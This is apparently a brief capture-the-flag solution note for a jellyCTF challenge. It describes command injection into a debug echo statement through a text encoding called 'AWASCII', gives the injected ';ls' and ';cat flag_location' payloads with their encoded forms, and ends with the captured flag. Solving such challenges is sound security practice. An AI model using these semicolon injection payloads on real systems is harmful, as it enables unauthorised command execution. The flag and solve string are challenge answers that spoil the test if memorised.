goal: get code injection into debug statement
eg "echo ;ls" and then "echo ;cat flag_location"

";ls" translatees to "awawawawawawa awa awawa awa awa awa awa awawa awawa awa awa"

AWASCII decoded result:
Decoding AWASCII to sane human text: awawawawawawa awa awawa awa awa awa awa awawa awawa awa awa

solve = "awawawawawawa awa awawawawa awawa awa awa awa awawa awa awawawawawawawawa awawa awa awawa awa awawawawa awawa awa awa awa awa awa awa awa awawa awa wa awawa awa awa awa"
flag = "jellyCTF{m4st3rs_1n_awat1sm}"
